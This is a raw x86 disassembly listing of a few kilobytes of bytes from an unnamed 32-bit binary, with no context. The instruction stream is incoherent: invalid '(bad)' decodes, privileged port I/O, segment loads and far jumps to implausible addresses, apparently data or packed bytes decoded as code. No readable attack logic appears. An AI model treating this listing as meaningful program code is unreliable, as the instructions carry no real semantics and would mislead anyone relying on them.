  40c431:	scas   eax,DWORD PTR es:[edi]
  40c432:	jecxz  0x40c40d
  40c434:	mov    bh,0xc2
  40c436:	push   eax
  40c437:	out    0xf2,al
  40c439:	aad    0xd2
  40c43b:	mov    ah,al
  40c43d:	xor    ah,dl
  40c43f:	adc    eax,0x7c9ba915
  40c444:	das    
  40c445:	dec    edi
  40c446:	in     eax,0x41
  40c448:	jae    0x40c482
  40c44a:	sar    DWORD PTR [ecx+ebp*2+0x730d911a],0xe1
  40c452:	push   0xcedaa052
  40c457:	mov    bl,ah
  40c459:	in     eax,dx
  40c45a:	repnz pop ebp
  40c45c:	mov    edx,0xe3aa21ea
  40c461:	dec    ebx
  40c462:	and    ebx,DWORD PTR [ecx]
  40c464:	add    ecx,DWORD PTR [ebx-0x18db5b7]
  40c46a:	jge    0x40c419
  40c46c:	jb     0x40c44b
  40c46e:	sbb    ah,BYTE PTR [esi]
  40c470:	inc    edx
  40c471:	out    0xfe,al
  40c473:	mov    eax,ds:0x4b6d7
  40c478:	sahf   
  40c479:	pop    ss
  40c47a:	jo     0x40c4c3
  40c47c:	mov    ebx,0xa3aec64f
  40c481:	inc    ecx
  40c482:	repz add edi,ecx
  40c485:	push   ebp
  40c486:	jg     0x40c424
  40c488:	in     eax,0xb2
  40c48a:	xor    BYTE PTR [eax+eax*2],dl
  40c48d:	pop    edi
  40c48e:	or     al,0x1f
  40c490:	jbe    0x40c4a7
  40c492:	in     eax,0x63
  40c494:	ins    BYTE PTR es:[edi],dx
  40c495:	and    esp,ebx
  40c497:	js     0x40c4cb
  40c499:	pop    es
  40c49a:	push   esp
  40c49b:	mov    al,0xc0
  40c49d:	push   es
  40c49e:	jae    0x40c48a
  40c4a0:	sub    ebp,DWORD PTR [bx+si]
  40c4a3:	or     edi,DWORD PTR [eax-0x4a]
  40c4a6:	mov    dh,0xad
  40c4a8:	arpl   WORD PTR ds:[edi+edx*8-0x79af94c8],bp
  40c4b0:	pop    gs
  40c4b2:	pop    edx
  40c4b3:	jo     0x40c4ff
  40c4b5:	mov    bl,0xa2
  40c4b7:	ret    0x419b
  40c4ba:	ror    BYTE PTR [eax+0xf],1
  40c4bd:	repz sub al,BYTE PTR [edx]
  40c4c0:	or     eax,0x398a0dc7
  40c4c5:	je     0x40c537
  40c4c7:	xchg   ebp,eax
  40c4c8:	or     eax,0x74fffe72
  40c4cd:	mov    ebp,0x6ed06600
  40c4d2:	mov    cs,WORD PTR [ebx+esi*4-0x58]
  40c4d6:	imul   ecx,DWORD PTR [edx+ecx*8+0x615e0d7f],0xe1e3f954
  40c4e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e2:	cli    
  40c4e3:	retf   0x4854
  40c4e6:	jmp    0x40c479
  40c4e8:	mov    ss,WORD PTR [esi]
  40c4ea:	inc    edx
  40c4eb:	shl    BYTE PTR [ecx-0x177426ee],0x8d
  40c4f2:	mov    dh,0xec
  40c4f4:	jbe    0x40c538
  40c4f6:	sub    esi,DWORD PTR [edi-0x5d2d0203]
  40c4fc:	jmp    0x7f7f302a
  40c501:	cmp    esi,DWORD PTR [edx-0xa1b4149]
  40c507:	sub    esi,DWORD PTR [esi]
  40c509:	hlt    
  40c50a:	jns    0x40c4cb
  40c50c:	add    al,0x55
  40c50e:	js     0x40c4e4
  40c510:	and    DWORD PTR [eax+0xa023e00],eax
  40c516:	mov    esp,0x17515868
  40c51b:	into   
  40c51c:	ficomp WORD PTR [ecx-0x19]
  40c51f:	inc    edx
  40c520:	xor    ebx,DWORD PTR [edx+0x23c9d6ac]
  40c526:	xor    BYTE PTR [ecx+0x54821ae1],cl
  40c52c:	adc    al,0xc3
  40c52e:	mov    eax,0x9e2554ee
  40c533:	sub    BYTE PTR [esi-0x1524cd70],dl
  40c539:	retf   0x271f
  40c53c:	jle    0x40c5bc
  40c53e:	inc    esi
  40c53f:	and    al,0xad
  40c541:	push   ds
  40c542:	pushf  
  40c543:	or     esp,ebx
  40c545:	adc    al,0x91
  40c547:	add    DWORD PTR [ebx-0x52656ee4],esi
  40c54d:	cld    
  40c54e:	stos   DWORD PTR es:[edi],eax
  40c54f:	lds    ecx,FWORD PTR [edi+eax*1]
  40c552:	push   0x66
  40c554:	sub    ebx,ecx
  40c556:	push   es
  40c557:	jge    0x40c5ba
  40c559:	push   eax
  40c55a:	mov    DWORD PTR [esp+edx*8-0x46],ecx
  40c55e:	cmp    edi,DWORD PTR [esi+0x6f]
  40c561:	test   DWORD PTR [ebx],ecx
  40c563:	mov    BYTE PTR [eax],ah
  40c565:	xor    DWORD PTR [edx-0x57a06829],ebx
  40c56b:	mov    edi,0xc5f3f9a
  40c570:	(bad)  
  40c571:	mov    ?,WORD PTR cs:[bp+di+0x5]
  40c576:	test   BYTE PTR [eax-0x76],dl
  40c579:	xchg   esi,eax
  40c57a:	fisub  DWORD PTR [eax]
  40c57c:	cdq    
  40c57d:	test   al,0x49
  40c57f:	jl     0x40c5cc
  40c581:	cmp    DWORD PTR [eax-0x1c],edi
  40c584:	xchg   esp,eax
  40c585:	loopne 0x40c559
  40c587:	sub    al,0x53
  40c589:	lock in al,dx
  40c58b:	adc    esp,ecx
  40c58d:	fcom   st(2)
  40c58f:	cmp    eax,0x1aaf928b
  40c594:	add    eax,0xd72500b5
  40c599:	mov    dh,0x53
  40c59b:	pusha  
  40c59c:	and    esp,DWORD PTR [ecx+0x77]
  40c59f:	cmp    BYTE PTR [ecx-0x5bdf24d8],ch
  40c5a5:	inc    ebx
  40c5a6:	out    0x2d,eax
  40c5a8:	mov    ecx,0xe4b35fe0
  40c5ad:	push   ss
  40c5ae:	inc    ecx
  40c5af:	mov    cl,0xee
  40c5b1:	or     al,0x62
  40c5b3:	push   ds
  40c5b4:	sbb    al,0x9a
  40c5b6:	jle    0x40c5f1
  40c5b8:	out    0x47,al
  40c5ba:	test   eax,0x9bb622e4
  40c5bf:	pushf  
  40c5c0:	push   0xffffffc0
  40c5c2:	cmp    al,BYTE PTR [esp+edi*4-0x8]
  40c5c6:	inc    esp
  40c5c7:	cmp    BYTE PTR [ebp+0x4bd26ec9],bh
  40c5cd:	rol    DWORD PTR [esi-0x1],0xb5
  40c5d1:	add    esp,esp
  40c5d3:	sbb    BYTE PTR [edx],ch
  40c5d5:	lods   eax,DWORD PTR ds:[esi]
  40c5d6:	sbb    edi,DWORD PTR [edx+0x51]
  40c5d9:	(bad)  
  40c5db:	push   0xa5eeafa0
  40c5e0:	(bad)  
  40c5e1:	mov    ds:0x16239914,eax
  40c5e6:	retf   
  40c5e7:	nop
  40c5e8:	jge    0x40c5fe
  40c5ea:	fdivrp st(0),st
  40c5ec:	gs pushf 
  40c5ee:	jp     0x40c5a3
  40c5f0:	pop    esp
  40c5f1:	pop    ds
  40c5f2:	out    0x42,eax
  40c5f4:	mov    gs,WORD PTR [ebp+0x39]
  40c5f7:	push   ss
  40c5f8:	mov    DWORD PTR [edi],ecx
  40c5fa:	retf   0x7746
  40c5fd:	mov    bl,0xc3
  40c5ff:	enter  0xa37e,0xb5
  40c603:	pop    eax
  40c604:	mov    bh,0x92
  40c606:	sti    
  40c607:	push   esi
  40c608:	push   ebx
  40c609:	repnz inc ecx
  40c60b:	add    al,0xf7
  40c60d:	sbb    eax,0xe2ab72a9
  40c612:	xor    BYTE PTR [ebx-0x2e],al
  40c615:	(bad)  
  40c616:	add    BYTE PTR fs:[ecx],ah
  40c619:	dec    edx
  40c61a:	mov    dh,0x95
  40c61c:	dec    eax
  40c61d:	in     eax,0xca
  40c61f:	jg     0x40c5ba
  40c621:	and    al,dh
  40c623:	sahf   
  40c624:	pusha  
  40c625:	xchg   edi,eax
  40c626:	and    eax,0x784ca7d6
  40c62b:	scas   al,BYTE PTR es:[edi]
  40c62c:	mov    edx,DWORD PTR [ebp-0x341a8740]
  40c632:	xchg   ecx,eax
  40c633:	xchg   edi,eax
  40c634:	cmp    eax,ebx
  40c636:	adc    cl,0xa7
  40c639:	mov    bl,0x97
  40c63b:	mov    WORD PTR [edx],?
  40c63d:	xor    DWORD PTR [esi+0xdfc465f],esp
  40c643:	cs dec edi
  40c645:	xor    BYTE PTR [esi-0x6f],al
  40c648:	xlat   BYTE PTR ds:[ebx]
  40c649:	scas   eax,DWORD PTR es:[edi]
  40c64a:	push   cs
  40c64b:	repnz mov dh,0x17
  40c64e:	or     BYTE PTR [ebx],bh
  40c650:	imul   BYTE PTR [esi]
  40c652:	push   ebx
  40c653:	mov    bh,0x5c
  40c655:	inc    esp
  40c656:	push   esp
  40c657:	mov    dl,0x64
  40c659:	pusha  
  40c65a:	pushf  
  40c65b:	data16 cld 
  40c65d:	xlat   BYTE PTR ds:[ebx]
  40c65e:	clc    
  40c65f:	mov    dh,BYTE PTR [ebp+0x45]
  40c662:	ret    0xc53d
  40c665:	jge    0x40c60e
  40c667:	cmp    BYTE PTR [ecx+0x78],bl
  40c66a:	mov    dh,0xde
  40c66c:	sahf   
  40c66d:	sahf   
  40c66e:	push   ss
  40c66f:	and    bl,BYTE PTR [esi+0x6a]
  40c672:	adc    cl,0x4d
  40c675:	or     eax,0xc394c842
  40c67a:	add    BYTE PTR [edi-0x387e0e49],0xce
  40c681:	xchg   BYTE PTR [esi+ebx*2+0x22],al
  40c685:	mov    eax,ds:0x6c30e143
  40c68a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c68b:	and    DWORD PTR [ecx+0x10],esi
  40c68e:	(bad)  
  40c68f:	in     eax,dx
  40c690:	push   edx
  40c691:	lods   al,BYTE PTR ds:[esi]
  40c692:	mov    BYTE PTR [esp+eiz*8-0x40],ah
  40c696:	popa   
  40c697:	scas   eax,DWORD PTR es:[edi]
  40c698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c699:	sub    al,0x9e
  40c69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c69c:	(bad)  
  40c69d:	cmc    
  40c69e:	ficom  DWORD PTR [ebx+0x6d]
  40c6a1:	push   edi
  40c6a2:	pop    ss
  40c6a3:	scas   al,BYTE PTR es:[edi]
  40c6a4:	xor    al,0x35
  40c6a6:	xor    DWORD PTR [edi-0x22932fcc],ecx
  40c6ac:	mov    ebx,0xea07bfa4
  40c6b1:	mov    ebp,0x8f3f756d
  40c6b6:	cmp    al,0x33
  40c6b8:	or     eax,0x6843ef2a
  40c6bd:	or     edx,ebx
  40c6bf:	push   cs
  40c6c0:	xor    ch,BYTE PTR [ebx-0x74b06fc5]
  40c6c6:	stos   BYTE PTR es:[edi],al
  40c6c7:	dec    eax
  40c6c8:	and    ah,BYTE PTR [ebx+0x2f]
  40c6cb:	stos   BYTE PTR es:[edi],al
  40c6cc:	jae    0x40c748
  40c6ce:	mov    ?,WORD PTR [edi]
  40c6d0:	push   ebp
  40c6d1:	cli    
  40c6d2:	or     DWORD PTR ds:0x3469e024,edx
  40c6d8:	retf   0xbfa
  40c6db:	push   ebp
  40c6dc:	ds pop edi
  40c6de:	scas   eax,DWORD PTR es:[edi]
  40c6df:	dec    edi
  40c6e0:	jmp    0x40c69f
  40c6e2:	data16 out 0xba,al
  40c6e5:	add    edx,esp
  40c6e7:	sar    BYTE PTR fs:[eax],1
  40c6ea:	mov    cs,WORD PTR [ebp-0x6]
  40c6ed:	sbb    ah,BYTE PTR [esi-0x7a90beea]
  40c6f3:	in     al,0x4b
  40c6f5:	arpl   WORD PTR [esi-0xb6bf058],dx
  40c6fb:	ret    0x3bd2
  40c6fe:	retf   
  40c6ff:	push   edx
  40c700:	out    dx,eax
  40c701:	int    0xa5
  40c703:	mov    dl,0xf2
  40c705:	add    ch,BYTE PTR [ebx]
  40c707:	mov    dl,0x7e
  40c709:	loop   0x40c6b9
  40c70b:	push   0x20
  40c70d:	push   ss
  40c70e:	arpl   di,dx
  40c710:	mov    edi,DWORD PTR [eax]
  40c712:	das    
  40c713:	xchg   WORD PTR [eax],dx
  40c716:	bound  ebx,QWORD PTR [ebx-0x21]
  40c719:	js     0x40c754
  40c71b:	mov    edi,0x115bfb4b
  40c720:	scas   eax,DWORD PTR es:[edi]
  40c721:	aas    
  40c722:	aad    0x78
  40c724:	jp     0x40c751
  40c726:	xchg   esp,eax
  40c727:	dec    ebx
  40c728:	adc    esi,DWORD PTR [eax+0x2c]
  40c72b:	cmp    ch,cl
  40c72d:	(bad)  
  40c72e:	push   edx
  40c72f:	jmp    0x40c6ba
  40c731:	cwde   
  40c732:	dec    esp
  40c733:	jp     0x40c7a9
  40c735:	(bad)  
  40c736:	sbb    DWORD PTR [esi-0x6],ebx
  40c739:	jle    0x40c7a6
  40c73b:	stos   BYTE PTR es:[edi],al
  40c73c:	mov    ds:0xcd757046,eax
  40c741:	lods   eax,DWORD PTR ds:[esi]
  40c742:	ret    
  40c743:	int    0xdd
  40c745:	hlt    
  40c746:	mov    edi,esp
  40c748:	in     al,0x35
  40c74a:	push   ss
  40c74b:	pop    edx
  40c74c:	mov    ecx,0x7e5fd3d0
  40c751:	dec    edx
  40c752:	sub    DWORD PTR [ebx-0x7d],eax
  40c755:	ret    
  40c756:	add    BYTE PTR [ebp+edi*8-0x34ac9cfe],cl
  40c75d:	jno    0x40c738
  40c75f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c760:	inc    ax
  40c762:	test   DWORD PTR [ecx-0xaea3837],esp
  40c768:	sbb    DWORD PTR [esi],0xffffff8e
  40c76b:	or     al,0xfa
  40c76d:	sbb    eax,0x33537d31
  40c772:	ins    DWORD PTR es:[edi],dx
  40c773:	add    eax,0x94c0e245
  40c778:	jle    0x40c7dd
  40c77a:	or     eax,0xc031467
  40c77f:	mov    WORD PTR [ebp+0x6c85bc6b],es
  40c785:	mov    ecx,0x3e33e6bd
  40c78a:	pushf  
  40c78b:	stos   BYTE PTR es:[edi],al
  40c78c:	(bad)  
  40c78d:	sbb    ecx,DWORD PTR [esi-0x265bf58c]
  40c793:	xchg   esp,eax
  40c794:	imul   edi,DWORD PTR [ebx-0x69b184a6],0xf6fc12c0
  40c79e:	adc    ebp,DWORD PTR [ebx+0x15]
  40c7a1:	enter  0xe51a,0x45
  40c7a5:	out    dx,al
  40c7a6:	retf   0xcb53
  40c7a9:	(bad)
  40c7ac:	or     eax,0x58b52bf2
  40c7b1:	jae    0x40c737
  40c7b3:	mov    edx,0x3742527f
  40c7b8:	stos   DWORD PTR es:[edi],eax
  40c7b9:	test   BYTE PTR [esp+esi*8],al
  40c7bc:	ja     0x40c7ef
  40c7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7bf:	fadd   DWORD PTR [ebx-0x8]
  40c7c2:	and    eax,0xaf1b5348
  40c7c7:	xor    BYTE PTR [edx-0x626f3765],0x7
  40c7ce:	fdivr  DWORD PTR [ebx]
  40c7d0:	in     eax,0xac
  40c7d2:	dec    ebp
  40c7d3:	shl    DWORD PTR [ebx+0x26],0xa
  40c7d7:	aad    0x75
  40c7d9:	or     esp,DWORD PTR [ebp+0x41]
  40c7dc:	sbb    eax,DWORD PTR ds:0x9fb0e1a2
  40c7e2:	aad    0xa6
  40c7e4:	fisubr WORD PTR [ebx+0x1c]
  40c7e7:	test   DWORD PTR [esi+0x52],esp
  40c7ea:	test   al,0xab
  40c7ec:	sub    eax,0xa48cf994
  40c7f1:	call   0x52de5c06
  40c7f6:	mov    cl,0x6f
  40c7f8:	xchg   ebx,eax
  40c7f9:	xor    DWORD PTR [edx+0x72eeff7a],ecx
  40c7ff:	clc    
  40c800:	fcomp  DWORD PTR [ebx-0x44]
  40c803:	or     eax,0x3aac0d5a
  40c808:	shl    BYTE PTR ds:0x39b4c7cb,0xe1
  40c80f:	and    eax,0x1357b314
  40c814:	(bad)  
  40c815:	push   eax
  40c816:	test   BYTE PTR [esi-0x1b5edec2],dl
  40c81c:	test   al,0xd8
  40c81e:	packuswb mm3,QWORD PTR [edx-0x45]
  40c822:	cmp    eax,0x54c4c9fb
  40c827:	shl    DWORD PTR [edi+0x3b],0x5
  40c82b:	lods   eax,DWORD PTR ds:[esi]
  40c82c:	xchg   edi,eax
  40c82d:	add    al,0xa4
  40c82f:	sub    al,0x0
  40c831:	mov    ebp,0x1ea359e8
  40c836:	cmc    
  40c837:	jno    0x40c8a2
  40c839:	loopne 0x40c7c7
  40c83b:	pusha  
  40c83c:	test   BYTE PTR [esi+eiz*2-0x4b1c2a21],0x54
  40c844:	ret    0xc8d3
  40c847:	adc    esi,DWORD PTR [eax+ebp*1]
  40c84a:	fsubr  QWORD PTR [edx]
  40c84c:	sbb    eax,0x5f9a1aff
  40c851:	lods   ax,WORD PTR ds:[esi]
  40c853:	or     eax,0xb7eae580
  40c858:	in     al,0x18
  40c85a:	xor    DWORD PTR [edi-0x244de78e],edi
  40c860:	mov    esp,0xa83ffcd7
  40c865:	ds das 
  40c867:	sub    ebx,eax
  40c869:	adc    al,0x86
  40c86b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c86d:	jle    0x40c832
  40c86f:	mov    eax,es
  40c871:	enter  0xfa89,0xb5
  40c875:	in     eax,dx
  40c876:	pushf  
  40c877:	mov    bl,bl
  40c879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c87a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c87b:	cs push cs
  40c87d:	mov    eax,0x1e32c1eb
  40c882:	aas    
  40c883:	scas   al,BYTE PTR es:[edi]
  40c884:	push   esp
  40c885:	push   esi
  40c886:	sbb    ecx,eax
  40c888:	xor    al,0xe
  40c88a:	mov    ch,0x66
  40c88c:	inc    esp
  40c88d:	test   BYTE PTR [eax-0x4b],al
  40c890:	in     eax,0x34
  40c892:	and    DWORD PTR [ebx+0x5d122b84],ebp
  40c898:	sbb    DWORD PTR [eax+0x18d6fffb],eax
  40c89e:	rol    ebx,1
  40c8a0:	scas   eax,DWORD PTR es:[edi]
  40c8a1:	jno    0x40c87b
  40c8a3:	sbb    DWORD PTR [ecx],ebp
  40c8a5:	jnp    0x40c923
  40c8a7:	int    0xfe
  40c8a9:	mov    al,0x4d
  40c8ab:	push   eax
  40c8ac:	and    al,0x5e
  40c8ae:	repz lahf 
  40c8b0:	push   cs
  40c8b1:	xchg   esi,eax
  40c8b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8b3:	pop    ebp
  40c8b4:	jne    0x40c8aa
  40c8b6:	adc    al,0x61
  40c8b8:	dec    ebp
  40c8b9:	xchg   esp,eax
  40c8ba:	pop    ds
  40c8bb:	jns    0x40c8ab
  40c8bd:	push   esp
  40c8be:	inc    edx
  40c8bf:	shr    DWORD PTR [ecx-0xa8eae35],1
  40c8c5:	es push edx
  40c8c7:	and    DWORD PTR [ebx-0x12929fc0],edi
  40c8cd:	nop
  40c8ce:	mov    ebx,0xa18355df
  40c8d3:	enter  0xf92f,0xe
  40c8d7:	lahf   
  40c8d8:	repz int3 
  40c8da:	repz mov ds:0xf6062fa0,eax
  40c8e0:	jbe    0x40c86d
  40c8e2:	push   eax
  40c8e3:	xchg   esi,eax
  40c8e4:	and    esi,DWORD PTR [ebp-0x11]
  40c8e7:	jo     0x40c8c8
  40c8e9:	jge    0x40c90f
  40c8eb:	in     eax,0x47
  40c8ed:	(bad)  
  40c8ee:	out    0xff,eax
  40c8f0:	adc    esi,DWORD PTR [ebp-0xa4deddd]
  40c8f6:	push   ss
  40c8f7:	cdq    
  40c8f8:	rol    BYTE PTR [ecx],cl
  40c8fa:	mov    eax,ds:0x46c00556
  40c8ff:	push   cs
  40c900:	out    dx,eax
  40c901:	sbb    dh,dh
  40c903:	neg    DWORD PTR [eax+0x38]
  40c906:	jo     0x40c949
  40c908:	data16 jge 0x40c91e
  40c90b:	cmp    ah,BYTE PTR [eax+0x26]
  40c90e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c90f:	jb     0x40c8cf
  40c911:	jbe    0x40c893
  40c913:	and    edi,DWORD PTR [edi-0x19d0c331]
  40c919:	ret    0x664d
  40c91c:	mov    ch,0xf8
  40c91e:	ja     0x40c947
  40c920:	jno    0x40c969
  40c922:	pop    es
  40c923:	mov    cs,WORD PTR [eax+edx*4-0x371a59b9]
  40c92a:	push   esi
  40c92b:	loop   0x40c8bf
  40c92d:	std    
  40c92e:	push   ebp
  40c92f:	and    eax,0x72fdb3af
  40c934:	loopne 0x40c930
  40c936:	xchg   ecx,eax
  40c937:	mov    al,0x31
  40c939:	std    
  40c93a:	adc    ebp,edx
  40c93c:	mov    esi,0x43412887
  40c941:	stos   DWORD PTR es:[edi],eax
  40c942:	int3   
  40c943:	xchg   ebp,eax
  40c944:	jbe    0x40c945
  40c946:	cmp    BYTE PTR [ebx],0x23
  40c949:	adc    al,0x18
  40c94b:	imul   esp,eax,0xffffff8e
  40c94e:	sbb    ebp,ebp
  40c950:	sbb    dl,BYTE PTR [ecx-0x11]
  40c953:	jae    0x40c979
  40c955:	imul   ebx,esp,0xb
  40c958:	push   edi
  40c959:	and    BYTE PTR [ecx],dh
  40c95b:	xchg   edx,eax
  40c95c:	or     DWORD PTR [edi-0x31],0x1c
  40c960:	add    BYTE PTR [ebp+0x5],bl
  40c963:	call   0x24e:0xa60673dd
  40c96a:	push   esp
  40c96b:	not    ebx
  40c96d:	js     0x40c935
  40c96f:	into   
  40c970:	lock test BYTE PTR [edx],al
  40c973:	in     eax,0xf3
  40c975:	adc    ebp,ebp
  40c977:	dec    edx
  40c978:	test   eax,0x93c2c6ff
  40c97d:	fs dec esi
  40c97f:	loopne 0x40c958
  40c981:	inc    esi
  40c982:	cli    
  40c983:	lds    eax,FWORD PTR [ebx]
  40c985:	cli    
  40c986:	xchg   ecx,eax
  40c987:	dec    ebp
  40c988:	out    0x1d,al
  40c98a:	mov    al,ds:0x923e8b7a
  40c98f:	shr    BYTE PTR [edx+0x4],cl
  40c992:	jmp    0x40c9b4
  40c994:	(bad)  
  40c996:	in     eax,0xe5
  40c998:	sahf   
  40c999:	xor    al,ah
  40c99b:	mov    DWORD PTR [ecx-0x33b1244],edi
  40c9a1:	inc    edx
  40c9a2:	and    ch,BYTE PTR [edi]
  40c9a4:	add    dl,cl
  40c9a6:	adc    dh,cl
  40c9a8:	xor    esi,0xffffff91
  40c9ab:	jae    0x40c99f
  40c9ad:	or     BYTE PTR [eax-0x564e76da],dh
  40c9b3:	cmp    BYTE PTR [edx+edi*4-0x73],al
  40c9b7:	sbb    ebx,esi
  40c9b9:	dec    ecx
  40c9ba:	idiv   BYTE PTR [edi-0x1bb0841d]
  40c9c0:	mov    al,0x38
  40c9c2:	pop    ebp
  40c9c3:	push   edx
  40c9c4:	iret   
  40c9c5:	sub    ecx,DWORD PTR [ebx]
  40c9c7:	fwait
  40c9c8:	imul   ebp,DWORD PTR ds:0x754e6e8e,0x4839483f
  40c9d2:	jo     0x40ca3b
  40c9d4:	cmp    cl,bh
  40c9d6:	mov    ?,WORD PTR [edx+ebx*8]
  40c9d9:	jge    0x40ca4e
  40c9db:	repz (bad) 
  40c9dd:	jl     0x40c99c
  40c9df:	nop
  40c9e0:	xchg   DWORD PTR [eax+eax*2-0x3a],edi
  40c9e4:	dec    ebp
  40c9e5:	mov    ebx,0x600244cd
  40c9ea:	pop    es
  40c9eb:	into   
  40c9ec:	push   ds
  40c9ed:	call   0x9d4aae28
  40c9f2:	jae    0x40c9ee
  40c9f4:	pop    esp
  40c9f5:	ja     0x40c989
  40c9f7:	cs loop 0x40ca57
  40c9fa:	add    eax,0x533438ee
  40c9ff:	sbb    BYTE PTR [eax-0xb],ch
  40ca02:	mov    DWORD PTR [eax-0x6a1e0ef3],esp
  40ca08:	jo     0x40c9a8
  40ca0a:	mov    BYTE PTR [ebx],ah
  40ca0c:	dec    edi
  40ca0d:	cmp    bh,dh
  40ca0f:	cdq    
  40ca10:	daa    
  40ca11:	fs cmp esi,eax
  40ca14:	neg    BYTE PTR [esi+0x1687dff]
  40ca1a:	mov    cs,WORD PTR [edx-0x36]
  40ca1d:	push   ds
  40ca1e:	mov    ds:0xbce37,eax
  40ca23:	inc    edi
  40ca24:	jge    0x40ca1f
  40ca26:	not    BYTE PTR [eax]
  40ca28:	repnz inc esi
  40ca2a:	jl     0x40c9e2
  40ca2c:	sub    DWORD PTR [eax+0x25],ebp
  40ca2f:	adc    dl,BYTE PTR [ebp-0x7d2743d4]
  40ca35:	or     al,0x50
  40ca37:	sub    ebx,ebp
  40ca39:	lock ret 0x7d0b
  40ca3d:	mov    ds:0xf4ce5837,eax
  40ca42:	sub    edx,DWORD PTR [edx-0x51103d3e]
  40ca48:	pop    ss
  40ca49:	test   eax,0x7f5565a3
  40ca4e:	add    eax,0xff019717
  40ca53:	aam    0x6
  40ca55:	mov    al,0x69
  40ca57:	lea    ebp,[eax]
  40ca59:	xor    ch,ah
  40ca5b:	sti    
  40ca5c:	push   cs
  40ca5d:	fsubr  st,st(5)
  40ca5f:	ficom  WORD PTR [eax-0x45]
  40ca62:	xor    esp,esp
  40ca64:	push   cs
  40ca65:	mov    gs,WORD PTR [edi]
  40ca67:	or     bl,al
  40ca69:	or     BYTE PTR [esi+0x7a9d5cc5],cl
  40ca6f:	addr16 mov ds:0xdb29,eax
  40ca73:	mov    cl,0x3f
  40ca75:	ret    
  40ca76:	popa   
  40ca77:	xchg   esp,eax
  40ca78:	adc    ecx,edi
  40ca7a:	jmp    0x9264fdfd
  40ca7f:	outs   dx,DWORD PTR ds:[esi]
  40ca80:	pop    ds
  40ca81:	(bad)  
  40ca82:	mov    dh,0x7d
  40ca84:	retf   
  40ca85:	pop    ss
  40ca86:	and    ebx,eax
  40ca88:	sub    ecx,DWORD PTR [ecx-0x3ecbede]
  40ca8e:	add    esi,DWORD PTR [ebx+0x6e]
  40ca91:	and    BYTE PTR [esi],dl
  40ca93:	pop    es
  40ca94:	int    0xce
  40ca96:	aas    
  40ca97:	mov    bl,0xe3
  40ca99:	pop    ebx
  40ca9a:	xor    BYTE PTR [ebx],al
  40ca9c:	jge    0x40ca47
  40ca9e:	les    ebx,FWORD PTR [eax-0x1817db21]
  40caa4:	add    al,0x87
  40caa6:	loopne 0x40ca5f
  40caa8:	or     BYTE PTR [edi],ah
  40caaa:	sub    al,0xa2
  40caac:	inc    edx
  40caad:	ja     0x40cafa
  40caaf:	into   
  40cab0:	jmp    0x2ee0:0x8337f13d
  40cab7:	push   esi
  40cab8:	jp     0x40cac6
  40caba:	cmc    
  40cabb:	out    0xfc,al
  40cabd:	mov    esi,0x14aacdf0
  40cac2:	repz retf 
  40cac4:	cld    
  40cac5:	sbb    ecx,DWORD PTR [ebp+0x1d]
  40cac8:	imul   esi,DWORD PTR [ecx-0xedd28ea],0x3ce5101a
  40cad2:	test   eax,0x1fe652a5
  40cad7:	pusha  
  40cad8:	push   edi
  40cad9:	add    al,0x96
  40cadb:	sti    
  40cadc:	iret   
  40cadd:	push   ss
  40cade:	cdq    
  40cadf:	push   cs
  40cae0:	scas   eax,DWORD PTR es:[edi]
  40cae1:	in     eax,dx
  40cae2:	sub    al,0xbb
  40cae4:	xchg   BYTE PTR [edi+ebp*4],ch
  40cae7:	test   dh,0x70
  40caea:	ja     0x40cad8
  40caec:	pusha  
  40caed:	adc    BYTE PTR [ebp-0x31],bl
  40caf0:	mov    fs,WORD PTR [eax]
  40caf2:	push   esi
  40caf3:	or     BYTE PTR [edi+0x65],dh
  40caf6:	(bad)  
  40caf7:	inc    eax
  40caf8:	mov    cl,0x14
  40cafa:	gs nop
  40cafc:	cmp    DWORD PTR [ebp-0x6900db54],edi
  40cb02:	int3   
  40cb03:	stos   BYTE PTR es:[edi],al
  40cb04:	call   0x631e:0xf5685c38
  40cb0b:	mov    esp,0xaff3c625
  40cb10:	pop    ecx
  40cb11:	into   
  40cb12:	pop    esi
  40cb13:	popa   
  40cb14:	jmp    0x9586:0x1ecf26b3
  40cb1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb1c:	xlat   BYTE PTR ds:[ebx]
  40cb1d:	jno    0x40cb27
  40cb1f:	int    0x47
  40cb21:	jns    0x40cafc
  40cb23:	imul   DWORD PTR [ecx-0xa290819]
  40cb29:	jbe    0x40cb00
  40cb2b:	dec    ecx
  40cb2c:	fild   DWORD PTR [esi+esi*8-0x406235f1]
  40cb33:	loope  0x40cba6
  40cb35:	push   es
  40cb36:	cmp    bh,BYTE PTR [ecx-0x2e]
  40cb39:	add    BYTE PTR [ebp+0x61],cl
  40cb3c:	call   0x242ec13f
  40cb41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb42:	mov    ecx,0x91c838ad
  40cb47:	mov    edx,0x3769e1d6
  40cb4c:	aam    0xcb
  40cb4e:	xor    al,0x74
  40cb50:	psubw  mm0,mm7
  40cb53:	dec    eax
  40cb54:	pop    esp
  40cb55:	push   ss
  40cb56:	stos   BYTE PTR es:[edi],al
  40cb57:	push   edx
  40cb58:	sbb    eax,0x37da78f8
  40cb5d:	jno    0x40cb4d
  40cb5f:	sub    dl,bl
  40cb61:	ss fcomp st(5)
  40cb64:	call   0x58f5:0x9b12b645
  40cb6b:	jno    0x40cbb2
  40cb6d:	mov    cl,0xf1
  40cb6f:	and    bh,BYTE PTR [edi-0x495720c2]
  40cb75:	xchg   edi,eax
  40cb76:	pop    ds
  40cb77:	mov    al,BYTE PTR [esi+0x3aec5733]
  40cb7d:	enter  0x5f65,0x93
  40cb81:	mov    al,ds:0x12b4b3b8
  40cb86:	retf   
  40cb87:	add    BYTE PTR [edi-0x7e],0x42
  40cb8b:	(bad)  
  40cb8c:	jb     0x40cb0e
  40cb8e:	jno    0x40cb9e
